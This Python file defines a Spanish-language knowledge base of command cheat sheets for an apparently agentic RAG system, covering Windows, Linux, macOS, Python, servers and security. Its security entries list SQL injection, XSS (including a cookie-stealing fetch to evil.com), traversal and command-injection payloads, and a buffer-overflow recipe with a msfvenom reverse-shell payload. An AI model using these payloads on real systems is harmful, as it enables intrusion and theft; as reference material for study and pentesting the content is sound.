"""
Base de conocimiento: Windows · Linux · macOS · Python · Redes · Seguridad · Agentes
Cada documento es una ficha técnica recuperable por el RAG.
"""

DOCUMENTS = [

# ══════════════════════════════════════════════════════
# WINDOWS — PowerShell y administración
# ══════════════════════════════════════════════════════
{"id": "win_ps_services", "platform": "windows", "tags": ["services", "powershell"],
 "title": "Windows: gestión de servicios con PowerShell",
 "content": """
Listar todos los servicios:     Get-Service
Iniciar servicio:               Start-Service -Name "wuauserv"
Detener servicio:               Stop-Service -Name "wuauserv"
Reiniciar servicio:             Restart-Service -Name "Spooler"
Cambiar inicio a automático:    Set-Service -Name "Spooler" -StartupType Automatic
Ver servicios en ejecución:     Get-Service | Where-Object {$_.Status -eq 'Running'}
Buscar servicio por nombre:     Get-Service -DisplayName "*SQL*"
Exportar estado servicios:      Get-Service | Export-Csv services.csv
Crear nuevo servicio:           New-Service -Name "MySvc" -BinaryPathName "C:\\app.exe"
Eliminar servicio:              sc.exe delete "MySvc"
"""},

{"id": "win_ps_processes", "platform": "windows", "tags": ["processes", "powershell"],
 "title": "Windows: gestión de procesos PowerShell",
 "content": """
Listar procesos:                Get-Process
Buscar proceso por nombre:      Get-Process -Name "chrome"
Matar proceso por nombre:       Stop-Process -Name "notepad" -Force
Matar proceso por PID:          Stop-Process -Id 1234 -Force
Ver uso de memoria:             Get-Process | Sort-Object WorkingSet -Descending | Select -First 10
Iniciar proceso:                Start-Process "notepad.exe"
Iniciar como administrador:     Start-Process "cmd.exe" -Verb RunAs
Ver árbol de procesos:          Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name
"""},

{"id": "win_registry", "platform": "windows", "tags": ["registry", "powershell"],
 "title": "Windows: operaciones de registro con PowerShell",
 "content": """
Leer clave:         Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
Crear clave:        New-Item -Path "HKCU:\\Software\\MiApp"
Crear valor:        Set-ItemProperty -Path "HKCU:\\Software\\MiApp" -Name "Config" -Value "test"
Eliminar valor:     Remove-ItemProperty -Path "HKCU:\\Software\\MiApp" -Name "Config"
Eliminar clave:     Remove-Item -Path "HKCU:\\Software\\MiApp" -Recurse
Buscar en registro: Get-ChildItem -Path "HKLM:\\SOFTWARE" -Recurse | Where-Object {$_.Name -match "Python"}
Rutas clave:
  Autorun usuario:   HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  Autorun sistema:   HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
  Variables entorno: HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment
  Python instalado:  HKLM:\\SOFTWARE\\Python
"""},

{"id": "win_networking", "platform": "windows", "tags": ["network", "powershell"],
 "title": "Windows: comandos de red PowerShell/CMD",
 "content": """
Ver interfaces:         Get-NetAdapter | Select Name,Status,LinkSpeed
Ver IPs:                Get-NetIPAddress | Select InterfaceAlias,IPAddress,PrefixLength
Ver rutas:              Get-NetRoute | Select DestinationPrefix,NextHop,InterfaceAlias
Ver puertos abiertos:   netstat -ano | findstr LISTENING
Ver conexiones activas: Get-NetTCPConnection | Where State -eq 'Established'
Ping:                   Test-Connection google.com -Count 4
Flush DNS:              Clear-DnsClientCache
Ver DNS cache:          Get-DnsClientCache
Deshabilitar firewall:  Set-NetFirewallProfile -All -Enabled False
Abrir puerto:           New-NetFirewallRule -DisplayName "Puerto 8080" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
Ver reglas firewall:    Get-NetFirewallRule | Where Enabled -eq True
Traceroute:             Test-NetConnection google.com -TraceRoute
"""},

{"id": "win_users", "platform": "windows", "tags": ["users", "powershell", "security"],
 "title": "Windows: gestión de usuarios y grupos",
 "content": """
Listar usuarios locales:        Get-LocalUser
Crear usuario:                  New-LocalUser -Name "usuario" -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)
Eliminar usuario:               Remove-LocalUser -Name "usuario"
Añadir a grupo administradores: Add-LocalGroupMember -Group "Administrators" -Member "usuario"
Ver grupos:                     Get-LocalGroup
Ver miembros de grupo:          Get-LocalGroupMember -Group "Administrators"
Ver usuario actual:             whoami /all
Ver privilegios:                whoami /priv
Ver sesiones activas:           query session
Forzar cierre de sesión:        logoff <ID_sesion>
"""},

{"id": "win_tasks", "platform": "windows", "tags": ["scheduler", "automation", "powershell"],
 "title": "Windows: Task Scheduler con PowerShell",
 "content": """
Listar tareas:          Get-ScheduledTask
Ejecutar tarea ahora:   Start-ScheduledTask -TaskName "MiTarea"
Deshabilitar tarea:     Disable-ScheduledTask -TaskName "MiTarea"
Crear tarea (al inicio):
  $action  = New-ScheduledTaskAction -Execute "python.exe" -Argument "C:\\script.py"
  $trigger = New-ScheduledTaskTrigger -AtStartup
  Register-ScheduledTask -TaskName "MiScript" -Action $action -Trigger $trigger -RunLevel Highest
Crear tarea periódica (cada hora):
  $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 1) -Once -At (Get-Date)
Eliminar tarea:         Unregister-ScheduledTask -TaskName "MiTarea" -Confirm:$false
"""},

{"id": "win_wmi", "platform": "windows", "tags": ["wmi", "powershell", "hardware"],
 "title": "Windows: información del sistema via WMI",
 "content": """
CPU:            Get-CimInstance Win32_Processor | Select Name,NumberOfCores,MaxClockSpeed
RAM:            Get-CimInstance Win32_PhysicalMemory | Select Capacity,Speed
Disco:          Get-CimInstance Win32_LogicalDisk | Select DeviceID,Size,FreeSpace
GPU:            Get-CimInstance Win32_VideoController | Select Name,AdapterRAM
OS:             Get-CimInstance Win32_OperatingSystem | Select Caption,Version,BuildNumber
BIOS:           Get-CimInstance Win32_BIOS | Select Manufacturer,Version
Red:            Get-CimInstance Win32_NetworkAdapterConfiguration | Where IPEnabled
Uptime:         (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
Temperatura GPU: (Get-CimInstance MSAcpi_ThermalZoneTemperature -Namespace root/wmi).CurrentTemperature
"""},

{"id": "win_eventlog", "platform": "windows", "tags": ["logs", "security", "powershell"],
 "title": "Windows: Event Log con PowerShell",
 "content": """
Ver logs del sistema:    Get-EventLog -LogName System -Newest 50
Ver logs de seguridad:   Get-EventLog -LogName Security -Newest 20
Buscar errores:          Get-EventLog -LogName Application -EntryType Error -Newest 10
Buscar evento por ID:    Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} | Select -First 5
IDs importantes:
  4624 = Login exitoso
  4625 = Login fallido
  4648 = Login con credenciales explícitas
  4688 = Nuevo proceso creado
  4720 = Cuenta creada
  4726 = Cuenta eliminada
  7045 = Nuevo servicio instalado
  1102 = Log de auditoría borrado
Exportar a CSV:          Get-EventLog -LogName Security | Export-Csv security_log.csv
"""},

# ══════════════════════════════════════════════════════
# LINUX — Administración del sistema
# ══════════════════════════════════════════════════════
{"id": "linux_systemd", "platform": "linux", "tags": ["systemd", "services"],
 "title": "Linux: gestión de servicios con systemd",
 "content": """
Ver estado servicio:      systemctl status nginx
Iniciar:                  systemctl start nginx
Detener:                  systemctl stop nginx
Reiniciar:                systemctl restart nginx
Habilitar al inicio:      systemctl enable nginx
Deshabilitar al inicio:   systemctl disable nginx
Ver todos los servicios:  systemctl list-units --type=service
Ver servicios fallidos:   systemctl --failed
Ver logs del servicio:    journalctl -u nginx -f
Ver logs desde el inicio: journalctl -b
Ver logs de hoy:          journalctl --since today
Recargar configuración:   systemctl daemon-reload
Crear unidad de servicio:
  /etc/systemd/system/miapp.service:
  [Unit]
  Description=Mi aplicación
  After=network.target
  [Service]
  ExecStart=/usr/bin/python3 /opt/miapp/app.py
  Restart=always
  User=www-data
  [Install]
  WantedBy=multi-user.target
"""},

{"id": "linux_processes", "platform": "linux", "tags": ["processes", "bash"],
 "title": "Linux: gestión de procesos",
 "content": """
Ver procesos:           ps aux
Ver en tiempo real:     top / htop
Buscar proceso:         ps aux | grep nginx
Matar proceso:          kill -9 <PID>
Matar por nombre:       pkill nginx
Ver árbol de procesos:  pstree -p
Ver proceso por puerto: ss -tlnp | grep :80
                        lsof -i :80
Prioridad:              nice -n 10 comando
Cambiar prioridad:      renice -n 5 -p <PID>
Ejecutar en background: comando &
Ver jobs:               jobs
Traer a foreground:     fg %1
Ejecutar sin HUP:       nohup comando &
Ver uso recursos:       /proc/<PID>/status
                        cat /proc/<PID>/cmdline
"""},

{"id": "linux_networking", "platform": "linux", "tags": ["network", "bash"],
 "title": "Linux: comandos de red",
 "content": """
Ver interfaces:         ip addr show / ifconfig
Ver rutas:              ip route show
Ver puertos:            ss -tlnp (TCP listening)
                        ss -ulnp (UDP listening)
Conexiones activas:     ss -tnp state established
Ping:                   ping -c 4 google.com
Traceroute:             traceroute google.com / mtr google.com
DNS lookup:             nslookup domain / dig domain
Escaneo básico:         nmap -sV -p 1-1000 <IP>
Captura de tráfico:     tcpdump -i eth0 port 80
Firewall (iptables):    iptables -L -n -v
                        iptables -A INPUT -p tcp --dport 22 -j ACCEPT
Firewall (ufw):         ufw allow 22/tcp
                        ufw status verbose
Curl con headers:       curl -I -L https://example.com
Wget:                   wget -c https://url/file.tar.gz
"""},

{"id": "linux_files", "platform": "linux", "tags": ["filesystem", "bash"],
 "title": "Linux: operaciones de sistema de ficheros",
 "content": """
Permisos:               chmod 755 archivo / chmod u+x archivo
Propietario:            chown usuario:grupo archivo
Buscar archivos:        find / -name "*.conf" -type f 2>/dev/null
Buscar contenido:       grep -r "password" /etc/ 2>/dev/null
Uso de disco:           df -h / du -sh /var/log/*
Ver archivos abiertos:  lsof
Montar unidad:          mount /dev/sdb1 /mnt/datos
Desmontar:              umount /mnt/datos
Crear enlace simbólico: ln -s /opt/app/bin/app /usr/local/bin/app
Comprimir:              tar -czvf archivo.tar.gz directorio/
Descomprimir:           tar -xzvf archivo.tar.gz
Copiar con progreso:    rsync -avh --progress origen/ destino/
Diferencias:            diff archivo1 archivo2
Archivos recientes:     find /var/log -mmin -60 -type f
SUID/GUID (privesc):    find / -perm -4000 -type f 2>/dev/null
"""},

{"id": "linux_users", "platform": "linux", "tags": ["users", "security"],
 "title": "Linux: gestión de usuarios",
 "content": """
Añadir usuario:         useradd -m -s /bin/bash usuario
                        adduser usuario (interactivo)
Cambiar contraseña:     passwd usuario
Eliminar usuario:       userdel -r usuario
Añadir a grupo sudo:    usermod -aG sudo usuario
Ver grupos usuario:     groups usuario / id usuario
Ver todos usuarios:     cat /etc/passwd
Ver usuarios con login: getent passwd | grep -v nologin
Sudoers:                visudo
  usuario ALL=(ALL) ALL
  usuario ALL=(ALL) NOPASSWD: ALL
Ver logins recientes:   last / lastb (intentos fallidos)
Bloquear usuario:       passwd -l usuario
Desbloquear:            passwd -u usuario
Switch usuario:         su - usuario
"""},

{"id": "linux_cron", "platform": "linux", "tags": ["cron", "automation"],
 "title": "Linux: cron y automatización",
 "content": """
Editar crontab:         crontab -e
Ver crontab actual:     crontab -l
Formato: minuto hora dia mes dia_semana comando
  */5 * * * *   comando  # cada 5 minutos
  0 2 * * *     comando  # cada día a las 2am
  0 0 * * 0     comando  # cada domingo
  @reboot       comando  # al inicio del sistema
  @daily        comando  # una vez al día

Cron del sistema:       /etc/cron.d/  /etc/cron.daily/
Logs de cron:           grep CRON /var/log/syslog
Alternativa (systemd):  systemd-run --on-calendar="*:0/5" comando
"""},

{"id": "linux_bash_scripting", "platform": "linux", "tags": ["bash", "scripting"],
 "title": "Linux: patrones de scripting bash avanzados",
 "content": """
Shebang:                #!/bin/bash
Variables:              NOMBRE="valor"
                        echo "${NOMBRE}"
Arrays:                 arr=(a b c); echo "${arr[0]}"
If/else:
  if [ -f "/etc/hosts" ]; then echo "existe"; fi
  if [ "$USER" = "root" ]; then ...; fi
Bucle for:              for f in /etc/*.conf; do echo "$f"; done
Bucle while:            while read line; do echo "$line"; done < archivo.txt
Funciones:
  mi_func() { echo "hola $1"; }
  mi_func "mundo"
Capturar salida:        RESULTADO=$(comando)
Redirección:            comando > salida.txt 2>&1
Pipes:                  ps aux | grep python | awk '{print $2}'
Verificar éxito:        comando && echo "OK" || echo "FALLO"
Trap de errores:        set -e; set -o pipefail
Argumentos:             $1 $2 ... $# (número) $@ (todos) $0 (nombre)
"""},

# ══════════════════════════════════════════════════════
# macOS — Administración
# ══════════════════════════════════════════════════════
{"id": "macos_launchd", "platform": "macos", "tags": ["launchd", "services"],
 "title": "macOS: gestión de servicios con launchd",
 "content": """
Ver agentes del usuario:    launchctl list
Cargar agente:              launchctl load ~/Library/LaunchAgents/com.miapp.plist
Descargar agente:           launchctl unload ~/Library/LaunchAgents/com.miapp.plist
Iniciar servicio:           launchctl start com.miapp
Detener servicio:           launchctl stop com.miapp

Ejemplo LaunchAgent plist (~/Library/LaunchAgents/com.miapp.plist):
<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ...>
<plist version="1.0">
<dict>
  <key>Label</key><string>com.miapp</string>
  <key>ProgramArguments</key>
  <array><string>/usr/bin/python3</string><string>/opt/miapp/app.py</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>/tmp/miapp.log</string>
</dict>
</plist>

Directorios:
  ~/Library/LaunchAgents/      # usuario, al login
  /Library/LaunchDaemons/      # sistema, al arranque
"""},

{"id": "macos_defaults", "platform": "macos", "tags": ["defaults", "configuration"],
 "title": "macOS: sistema defaults para configuración",
 "content": """
Leer preferencia:        defaults read com.apple.finder AppleShowAllFiles
Escribir preferencia:    defaults write com.apple.finder AppleShowAllFiles -bool TRUE
Eliminar preferencia:    defaults delete com.apple.finder AppleShowAllFiles
Aplicar cambios Finder:  killall Finder

Configuraciones útiles:
  Mostrar archivos ocultos:    defaults write com.apple.finder AppleShowAllFiles YES
  Mostrar extensiones:         defaults write NSGlobalDomain AppleShowAllExtensions -bool true
  Dock sin retraso:            defaults write com.apple.dock autohide-delay -float 0
  Capturas en formato PNG:     defaults write com.apple.screencapture type png
  Deshabilitar autocorrección: defaults write NSGlobalDomain NSAutomaticSpellingCorrectionEnabled -bool false
"""},

{"id": "macos_networking", "platform": "macos", "tags": ["network", "macos"],
 "title": "macOS: comandos de red",
 "content": """
Ver interfaces:          networksetup -listallnetworkservices
                         ifconfig
Ver IP:                  ipconfig getifaddr en0
Flush DNS:               sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder
Ver puertos:             netstat -an | grep LISTEN
                         lsof -i TCP:80
Firewall:                sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
                         sudo pfctl -e (habilitar pf)
Ver conexiones:          lsof -i -n -P | grep ESTABLISHED
DNS actual:              scutil --dns | grep nameserver
Cambiar DNS:             networksetup -setdnsservers Wi-Fi 1.1.1.1 8.8.8.8
ARP table:               arp -a
"""},

# ══════════════════════════════════════════════════════
# PYTHON — Scripting del sistema
# ══════════════════════════════════════════════════════
{"id": "python_os_system", "platform": "all", "tags": ["python", "os", "system"],
 "title": "Python: operaciones del sistema operativo",
 "content": """
import os, sys, platform, subprocess, pathlib

# Detectar OS
platform.system()        # 'Windows', 'Linux', 'Darwin'
platform.version()       # versión detallada
os.name                  # 'nt' (Windows) o 'posix' (Linux/Mac)

# Rutas
Path = pathlib.Path
home = Path.home()           # directorio home
cwd = Path.cwd()             # directorio actual
Path('ruta').exists()        # verificar existencia
Path('ruta').mkdir(parents=True, exist_ok=True)

# Variables de entorno
os.environ.get('PATH')
os.environ['MI_VAR'] = 'valor'

# Ejecutar comandos
result = subprocess.run(['ls', '-la'], capture_output=True, text=True, timeout=30)
result.stdout, result.stderr, result.returncode

# Ejecutar en shell
out = subprocess.check_output('ps aux | grep python', shell=True, text=True)

# Información del sistema
os.getpid()              # PID actual
os.getlogin()            # usuario actual
os.cpu_count()           # núcleos CPU
"""},

{"id": "python_files", "platform": "all", "tags": ["python", "files"],
 "title": "Python: operaciones de archivos avanzadas",
 "content": """
import os, pathlib, shutil, glob, json, csv

# Leer/escribir
with open('archivo.txt', 'r', encoding='utf-8') as f:
    contenido = f.read()

# JSON
with open('config.json', 'w') as f:
    json.dump(datos, f, indent=2, ensure_ascii=False)

# CSV
import csv
with open('datos.csv', 'w', newline='') as f:
    writer = csv.DictWriter(f, fieldnames=['nombre', 'valor'])
    writer.writeheader()
    writer.writerows(filas)

# Listar con pathlib
for f in Path('/var/log').rglob('*.log'):
    print(f, f.stat().st_size)

# Copiar/mover
shutil.copy2('origen', 'destino')   # preserva metadatos
shutil.move('origen', 'destino')
shutil.copytree('dir_origen', 'dir_destino')
shutil.rmtree('directorio')

# Buscar archivos
matches = glob.glob('/etc/**/*.conf', recursive=True)

# Permisos
os.chmod('archivo', 0o755)
os.chown('archivo', uid, gid)  # solo root en Linux
"""},

{"id": "python_networking", "platform": "all", "tags": ["python", "network", "sockets"],
 "title": "Python: programación de red y sockets",
 "content": """
import socket, urllib.request, http.server, threading

# Socket TCP básico (cliente)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.1', 80))
s.send(b'GET / HTTP/1.0\r\n\r\n')
data = s.recv(4096)
s.close()

# Servidor TCP simple
with socket.socket() as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8080))
    s.listen(5)
    conn, addr = s.accept()
    with conn:
        data = conn.recv(1024)
        conn.sendall(b'HTTP/1.0 200 OK\r\n\r\nHola')

# Ping Python (sin root)
import subprocess
result = subprocess.run(['ping', '-c', '1', 'google.com'],
                        capture_output=True, timeout=5)

# HTTP server simple
handler = http.server.SimpleHTTPRequestHandler
with http.server.HTTPServer(('', 8000), handler) as srv:
    srv.serve_forever()

# Obtener IP local
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

# Port scan simple
def port_open(host, port, timeout=1):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket().connect((host, port))
        return True
    except:
        return False
"""},

{"id": "python_processes", "platform": "all", "tags": ["python", "processes", "psutil"],
 "title": "Python: gestión de procesos con psutil",
 "content": """
import psutil, os

# CPU/RAM/Disco
psutil.cpu_percent(interval=1)
psutil.virtual_memory()        # .total .available .percent
psutil.disk_usage('/')         # .total .used .free .percent
psutil.net_io_counters()       # bytes_sent, bytes_recv

# Procesos
for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
    print(proc.info)

# Buscar proceso
procs = [p for p in psutil.process_iter(['name']) if 'python' in p.info['name']]

# Proceso específico
p = psutil.Process(1234)
p.name(), p.cmdline(), p.status()
p.memory_info().rss / 1024**2   # MB de RAM
p.cpu_percent()
p.kill()

# Conexiones de red
for conn in psutil.net_connections():
    if conn.status == 'LISTEN':
        print(conn.laddr.port)

# Temperatura
temps = psutil.sensors_temperatures()
"""},

# ══════════════════════════════════════════════════════
# SEGURIDAD — Herramientas y técnicas
# ══════════════════════════════════════════════════════
{"id": "sec_nmap", "platform": "all", "tags": ["security", "nmap", "recon"],
 "title": "Seguridad: nmap — reconocimiento de red",
 "content": """
Escaneo básico:          nmap 192.168.1.0/24
Detección servicios:     nmap -sV 192.168.1.1
Detección OS:            nmap -O 192.168.1.1
Escaneo completo:        nmap -A -T4 192.168.1.1
Puertos específicos:     nmap -p 22,80,443,8080 192.168.1.1
Todos los puertos:       nmap -p- 192.168.1.1
UDP:                     nmap -sU --top-ports 100 192.168.1.1
Sin ping:                nmap -Pn 192.168.1.1
Scripts NSE:             nmap --script vuln 192.168.1.1
                         nmap --script smb-vuln* 192.168.1.1
Output XML:              nmap -oX output.xml 192.168.1.0/24
Versiones CVE:           nmap --script vulscan 192.168.1.1
Stealth scan:            nmap -sS (SYN scan)
"""},

{"id": "sec_analysis", "platform": "all", "tags": ["security", "malware", "analysis"],
 "title": "Seguridad: análisis de malware estático",
 "content": """
Información básica:      file malware.exe
                         strings malware.exe | head -100
Hashes:                  sha256sum malware.exe
                         md5sum malware.exe
PE headers (Python):
  import pefile
  pe = pefile.PE('malware.exe')
  pe.OPTIONAL_HEADER     # entry point, image base
  pe.sections            # .text .data .rsrc
  pe.DIRECTORY_ENTRY_IMPORT  # DLLs importadas

Strings con contexto:    strings -a -n 6 malware.exe | grep -E "http|cmd|powershell|reg"
Entropía (packed/encrypted):
  Entropía alta (>7) sugiere cifrado o compresión
  Herramienta: python-entropy, binwalk

Análisis de imports:
  CreateRemoteThread, VirtualAllocEx, WriteProcessMemory  → inyección
  RegCreateKeyEx, RegSetValueEx                          → persistencia
  InternetConnect, HttpSendRequest                       → C2
  CreateService, ControlService                          → servicio malicioso

YARA básico:
  rule MiRegla { strings: $s1 = "http://evil.com" condition: $s1 }
  yara mi_regla.yar malware.exe
"""},

{"id": "sec_exploit_dev", "platform": "all", "tags": ["security", "exploit", "pwn"],
 "title": "Seguridad: desarrollo de exploits — conceptos clave",
 "content": """
Buffer Overflow x86:
  1. Identificar offset: pattern_create 200 → enviar → pattern_offset $EIP
  2. Controlar EIP: offset + 4 bytes = nueva dirección
  3. Badchars: identificar bytes que rompen el payload
  4. JMP ESP: buscar instrucción en módulos sin ASLR/NX
  5. Shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f python -b "\\x00"

Protecciones y bypasses:
  ASLR: info leak + calcular base, ret2plt, heap spray
  NX/DEP: ROP chains (gadgets: ROPgadget --binary bin)
  Stack Canary: info leak, brute force (fork servers), overwrite TLS
  PIE: info leak del heap/stack/binary

Python pwntools básico:
  from pwn import *
  p = process('./binario')  # o remote('host', puerto)
  payload = b'A'*offset + p32(ret_addr) + shellcode
  p.sendline(payload)
  p.interactive()

GDB con peda/pwndbg:
  checksec    → ver protecciones
  pattern 200 → crear patrón
  run < input → ejecutar con input
  info registers → ver registros al crash
"""},

{"id": "sec_web", "platform": "all", "tags": ["security", "web", "pentest"],
 "title": "Seguridad web: técnicas básicas",
 "content": """
SQL Injection:
  ' OR '1'='1' --
  UNION SELECT 1,2,3--
  '; DROP TABLE users--
  sqlmap -u "http://site.com/page?id=1" --dbs

XSS:
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=fetch('http://evil.com?c='+document.cookie)>

SSRF:
  Targets: 169.254.169.254 (AWS metadata), 127.0.0.1
  file:///etc/passwd, http://localhost:22

Directory traversal:
  ../../../etc/passwd
  ..%2F..%2F..%2Fetc%2Fpasswd
  php://filter/convert.base64-encode/resource=index.php

Command injection:
  ; id
  | whoami
  `id`
  $(id)

Herramientas:
  Burp Suite, OWASP ZAP, ffuf, gobuster, nikto, wfuzz
  ffuf -w wordlist.txt -u http://site.com/FUZZ
  gobuster dir -u http://site.com -w /usr/share/wordlists/dirb/common.txt
"""},

# ══════════════════════════════════════════════════════
# SERVIDORES Y APLICACIONES
# ══════════════════════════════════════════════════════
{"id": "srv_nginx", "platform": "linux", "tags": ["nginx", "server", "web"],
 "title": "Nginx: configuración y administración",
 "content": """
Instalar:         apt install nginx / brew install nginx
Iniciar:          systemctl start nginx / nginx
Recargar config:  nginx -s reload
Verificar config: nginx -t
Config principal: /etc/nginx/nginx.conf
Sites:            /etc/nginx/sites-available/ → sites-enabled/

Proxy reverso básico:
server {
    listen 80;
    server_name mi.dominio.com;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

HTTPS con SSL:
server {
    listen 443 ssl;
    ssl_certificate /etc/ssl/certs/cert.pem;
    ssl_certificate_key /etc/ssl/private/key.pem;
}

Rate limiting:    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
Logs:             /var/log/nginx/access.log  /var/log/nginx/error.log
"""},

{"id": "srv_docker", "platform": "all", "tags": ["docker", "containers"],
 "title": "Docker: comandos esenciales",
 "content": """
Imágenes:
  docker pull ubuntu:22.04
  docker images
  docker rmi <imagen>
  docker build -t mi-app:1.0 .

Contenedores:
  docker run -d -p 8080:80 --name web nginx
  docker run -it ubuntu:22.04 bash
  docker ps               # en ejecución
  docker ps -a            # todos
  docker stop <id>
  docker rm <id>
  docker exec -it <id> bash

Volúmenes y redes:
  docker run -v /host/path:/container/path imagen
  docker network create mi-red
  docker run --network mi-red imagen

Docker Compose:
  docker compose up -d
  docker compose down
  docker compose logs -f
  docker compose exec servicio bash

Dockerfile básico:
  FROM python:3.12-slim
  WORKDIR /app
  COPY requirements.txt .
  RUN pip install -r requirements.txt
  COPY . .
  CMD ["python", "app.py"]
"""},

{"id": "srv_python_server", "platform": "all", "tags": ["python", "fastapi", "server"],
 "title": "Python: servidores web — FastAPI y Flask",
 "content": """
FastAPI básico:
  from fastapi import FastAPI
  app = FastAPI()
  @app.get("/")
  def root(): return {"status": "ok"}
  @app.post("/data")
  async def recibir(body: dict): return body
  # Ejecutar: uvicorn app:app --host 0.0.0.0 --port 8000 --reload

Flask básico:
  from flask import Flask, request, jsonify
  app = Flask(__name__)
  @app.route('/api', methods=['GET', 'POST'])
  def api():
      return jsonify({"data": request.json})
  if __name__ == '__main__':
      app.run(host='0.0.0.0', port=5000, debug=True)

Servidor HTTP simple (debug):
  python -m http.server 8000

WebSocket con FastAPI:
  from fastapi import WebSocket
  @app.websocket("/ws")
  async def ws(websocket: WebSocket):
      await websocket.accept()
      while True:
          data = await websocket.receive_text()
          await websocket.send_text(f"echo: {data}")
"""},

# ══════════════════════════════════════════════════════
# AGENTES IA — Patrones y capacidades
# ══════════════════════════════════════════════════════
{"id": "agent_patterns", "platform": "all", "tags": ["agent", "ai", "patterns"],
 "title": "Patrones de agente IA: ReAct, planificación y uso de herramientas",
 "content": """
Patrón ReAct (Reason + Act):
  1. PENSAMIENTO: analizar la tarea y planificar
  2. ACCIÓN: ejecutar una herramienta
  3. OBSERVACIÓN: analizar el resultado
  4. Repetir hasta completar la tarea

Principios de un buen agente:
  - Descomponer tareas complejas en pasos simples
  - Verificar el resultado de cada acción antes de continuar
  - Si un paso falla, intentar alternativa o reportar el error
  - No asumir éxito sin verificar la salida
  - Preferir operaciones reversibles cuando sea posible
  - Registrar cada decisión importante

Uso correcto de herramientas:
  - shell: para comandos del sistema, información del entorno, instalar paquetes
  - read_file: antes de modificar cualquier archivo
  - write_file: con contenido completo y verificado
  - run_python: para lógica compleja, procesamiento de datos, análisis
  - web_fetch: para obtener documentación, APIs, recursos externos
  - list_processes: para diagnóstico del sistema
  - list_directory: para explorar la estructura antes de operar

Estrategia para tareas de sistema:
  1. Detectar OS y herramientas disponibles
  2. Verificar permisos necesarios
  3. Hacer backup si se van a modificar archivos críticos
  4. Ejecutar en modo prueba si es posible
  5. Verificar el resultado final
"""},

{"id": "agent_os_detection", "platform": "all", "tags": ["agent", "os", "detection"],
 "title": "Agente: detección del sistema operativo y capacidades",
 "content": """
Python para detectar OS y herramientas disponibles:

import platform, os, shutil, subprocess

os_name = platform.system()     # 'Windows', 'Linux', 'Darwin'
os_ver  = platform.version()
arch    = platform.machine()    # 'AMD64', 'x86_64', 'arm64'
user    = os.getlogin()

# Detectar herramientas disponibles
tools = {}
for tool in ['git', 'python3', 'pip', 'node', 'npm', 'docker', 'nmap', 'curl', 'wget']:
    tools[tool] = shutil.which(tool) is not None

# Permisos de administrador
def is_admin():
    if os_name == 'Windows':
        try:
            import ctypes; return ctypes.windll.shell32.IsUserAnAdmin()
        except: return False
    else:
        return os.getuid() == 0

# Comandos según OS
if os_name == 'Windows':
    list_dir = 'Get-ChildItem -Force'
    pkg_mgr  = 'winget install' if shutil.which('winget') else 'choco install'
elif os_name == 'Linux':
    list_dir = 'ls -la'
    pkg_mgr  = 'apt install' if shutil.which('apt') else 'yum install'
elif os_name == 'Darwin':
    list_dir = 'ls -la'
    pkg_mgr  = 'brew install'
"""},

]

def get_all_documents():
    return DOCUMENTS

def get_documents_by_platform(platform):
    return [d for d in DOCUMENTS if d["platform"] in (platform, "all")]

def get_documents_by_tags(tags):
    return [d for d in DOCUMENTS if any(t in d["tags"] for t in tags)]
